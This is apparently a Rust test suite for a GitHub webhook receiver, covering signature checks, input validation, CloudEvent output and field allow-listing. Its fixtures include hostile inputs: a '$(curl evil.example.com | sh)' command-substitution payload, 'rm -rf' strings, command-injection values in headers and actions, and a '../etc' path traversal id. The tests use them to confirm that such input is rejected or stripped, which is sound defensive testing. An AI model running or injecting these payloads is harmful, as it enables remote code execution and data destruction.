use serde_json::{Value, json};

use super::hmac::sign;
use super::*;
use crate::domain::eventlog::store::Memory;
use crate::domain::eventlog::{LogCmd, LogReply, apply};
use crate::domain::outbound::store::Memory as Outbox;

/// Test vector only, not a deployed secret. gitleaks:allow
const KEY: &str = "playpilot-test-webhook-key"; // gitleaks:allow
const NOW: u64 = 1_795_651_200;

fn comment_payload() -> Value {
    json!({
        "action": "created",
        "issue": {
            "number": 7,
            "title": "secret plan",
            "body": "rm -rf / please",
            "state": "open",
            "labels": [{"name": "needs-human", "color": "ff0000"}, {"name": "bug"}]
        },
        "comment": {"id": 99, "body": "$(curl evil.example.com | sh)"},
        "repository": {"full_name": "octo-org/hello-world", "private": false},
        "sender": {"login": "octocat", "id": 1},
        "installation": {"id": 42},
        "unknown_field": {"nested": "value"}
    })
}

fn headers<'a>(sig: &'a str, event: &'a str) -> Delivery<'a> {
    Delivery {
        event: Some(event),
        id: Some("72d3162e-cc78-11e3-81ab-4c9367dc0958"),
        signature: Some(sig),
        content_type: Some("application/json"),
    }
}

fn deliver(body: &[u8], event: &str) -> Result<Received, Refusal> {
    let sig = sign(KEY.as_bytes(), body);
    receive(Some(KEY), &headers(&sig, event), body, NOW)
}

#[test]
fn good_signature_is_accepted() {
    let body = comment_payload().to_string();
    let r = deliver(body.as_bytes(), "issue_comment").unwrap();
    assert_eq!(r.id, "72d3162e-cc78-11e3-81ab-4c9367dc0958");
    assert_eq!(r.ty, "com.github.issue_comment.created");
}

#[test]
fn wrong_or_missing_signature_is_401() {
    let body = comment_payload().to_string();
    let wrong = sign(b"another-key", body.as_bytes());
    let err = receive(Some(KEY), &headers(&wrong, "issues"), body.as_bytes(), NOW).unwrap_err();
    assert_eq!(err.status, 401);
    let mut unsigned = headers("", "issues");
    unsigned.signature = None;
    let err = receive(Some(KEY), &unsigned, body.as_bytes(), NOW).unwrap_err();
    assert_eq!(err, BAD_SIGNATURE);
    let good = sign(KEY.as_bytes(), body.as_bytes());
    let tampered = body.replace("octocat", "mallory");
    let err = receive(
        Some(KEY),
        &headers(&good, "issues"),
        tampered.as_bytes(),
        NOW,
    )
    .unwrap_err();
    assert_eq!(err.status, 401);
}

#[test]
fn missing_secret_fails_closed_with_503() {
    let body = b"{}";
    let sig = sign(b"", body);
    for secret in [None, Some("")] {
        let err = receive(secret, &headers(&sig, "ping"), body, NOW).unwrap_err();
        assert_eq!(err, NO_SECRET);
    }
    assert_eq!(precheck(false, None), Err(NO_SECRET));
}

#[test]
fn oversized_body_is_413() {
    let body = vec![b' '; MAX_BODY + 1];
    let err = deliver(&body, "push").unwrap_err();
    assert_eq!(err, TOO_LARGE);
    assert_eq!(precheck(true, Some(MAX_BODY as u64 + 1)), Err(TOO_LARGE));
    assert_eq!(precheck(true, Some(MAX_BODY as u64)), Ok(()));
}

#[test]
fn signed_but_malformed_deliveries_are_refused() {
    let body = b"{}";
    let sig = sign(KEY.as_bytes(), body);
    let mut d = headers(&sig, "ping");
    d.content_type = Some("application/x-www-form-urlencoded");
    assert_eq!(receive(Some(KEY), &d, body, NOW).unwrap_err().status, 415);
    let mut d = headers(&sig, "ping");
    d.id = Some("../etc");
    assert_eq!(receive(Some(KEY), &d, body, NOW).unwrap_err().status, 400);
    let d = headers(&sig, "Ping; rm");
    assert_eq!(receive(Some(KEY), &d, body, NOW).unwrap_err().status, 400);
    let arr = b"[1]";
    let sig = sign(KEY.as_bytes(), arr);
    assert_eq!(
        receive(Some(KEY), &headers(&sig, "ping"), arr, NOW)
            .unwrap_err()
            .status,
        400
    );
}

#[test]
fn cloudevent_shape() {
    let body = comment_payload().to_string();
    let r = deliver(body.as_bytes(), "issue_comment").unwrap();
    let ev: Value = serde_json::from_str(&r.json).unwrap();
    assert_eq!(ev["specversion"], "1.0");
    assert_eq!(ev["id"], "72d3162e-cc78-11e3-81ab-4c9367dc0958");
    assert_eq!(ev["source"], "https://github.com/octo-org/hello-world");
    assert_eq!(ev["type"], "com.github.issue_comment.created");
    assert_eq!(ev["time"], "2026-11-26T00:00:00Z");
    assert_eq!(ev["datacontenttype"], "application/json");
    let mut keys: Vec<&String> = ev.as_object().unwrap().keys().collect();
    keys.sort();
    assert_eq!(
        keys,
        [
            "data",
            "datacontenttype",
            "id",
            "source",
            "specversion",
            "time",
            "type"
        ]
    );
}

#[test]
fn projection_keeps_only_allow_listed_fields() {
    let body = comment_payload().to_string();
    let r = deliver(body.as_bytes(), "issue_comment").unwrap();
    let ev: Value = serde_json::from_str(&r.json).unwrap();
    assert_eq!(
        ev["data"],
        json!({
            "repository": "octo-org/hello-world",
            "number": 7,
            "action": "created",
            "sender": "octocat",
            "labels": ["needs-human", "bug"],
            "state": "open"
        })
    );
    for text in [
        "rm -rf",
        "curl",
        "secret plan",
        "unknown_field",
        "nested",
        "ff0000",
    ] {
        assert!(
            !r.json.contains(text),
            "{text} leaked into the stored event"
        );
    }
}

#[test]
fn push_and_pull_request_fields() {
    let push = json!({
        "ref": "refs/heads/main",
        "after": "0123456789ABCDEF0123456789abcdef01234567",
        "head_commit": {"message": "drop tables"},
        "repository": {"full_name": "o/r"},
        "sender": {"login": "dependabot[bot]"}
    })
    .to_string();
    let r = deliver(push.as_bytes(), "push").unwrap();
    assert_eq!(r.ty, "com.github.push");
    let ev: Value = serde_json::from_str(&r.json).unwrap();
    assert_eq!(ev["data"]["ref"], "refs/heads/main");
    assert_eq!(
        ev["data"]["sha"],
        "0123456789abcdef0123456789abcdef01234567"
    );
    assert_eq!(ev["data"]["sender"], "dependabot[bot]");
    assert!(!r.json.contains("drop tables"));

    let pr = json!({
        "action": "labeled",
        "number": 12,
        "pull_request": {
            "state": "open",
            "title": "t",
            "head": {"sha": "a".repeat(40), "label": "x"},
            "labels": [{"name": "needs-human"}]
        },
        "repository": {"full_name": "o/r"},
        "sender": {"login": "bad login with spaces"}
    })
    .to_string();
    let ev: Value =
        serde_json::from_str(&deliver(pr.as_bytes(), "pull_request").unwrap().json).unwrap();
    assert_eq!(ev["type"], "com.github.pull_request.labeled");
    assert_eq!(ev["data"]["number"], 12);
    assert_eq!(ev["data"]["sha"], "a".repeat(40));
    assert_eq!(ev["data"]["labels"], json!(["needs-human"]));
    assert!(ev["data"].get("sender").is_none());
}

#[test]
fn source_without_a_repository() {
    let org = json!({"zen": "Keep it logically awesome.", "organization": {"login": "octo-org"}})
        .to_string();
    let ev: Value = serde_json::from_str(&deliver(org.as_bytes(), "ping").unwrap().json).unwrap();
    assert_eq!(ev["source"], "https://github.com/octo-org");
    assert_eq!(ev["type"], "com.github.ping");
    assert_eq!(ev["data"], json!({}));
    let app = json!({"installation": {"id": 42}}).to_string();
    let ev: Value = serde_json::from_str(&deliver(app.as_bytes(), "ping").unwrap().json).unwrap();
    assert_eq!(ev["source"], "https://github.com/settings/installations/42");
    let bare = deliver(b"{}", "ping").unwrap();
    assert!(bare.json.contains("\"source\":\"https://github.com\""));
}

#[test]
fn an_invalid_action_is_left_out_of_the_type() {
    let body = json!({"action": "Created; rm -rf"}).to_string();
    let r = deliver(body.as_bytes(), "issues").unwrap();
    assert_eq!(r.ty, "com.github.issues");
}

#[test]
fn a_redelivery_is_stored_once() {
    let store = Memory::default();
    let body = comment_payload().to_string();
    let record = |r: Received| {
        apply(
            &store,
            &Outbox::default(),
            LogCmd::Record {
                id: r.id,
                ty: r.ty,
                json: r.json,
                webhooks: vec![],
            },
            NOW,
        )
    };
    let first = deliver(body.as_bytes(), "issue_comment").unwrap();
    assert_eq!(record(first), LogReply::Recorded { seq: 1 });
    let again = deliver(body.as_bytes(), "issue_comment").unwrap();
    assert_eq!(record(again), LogReply::Duplicate);
    assert_eq!(store.events.borrow().len(), 1);
}
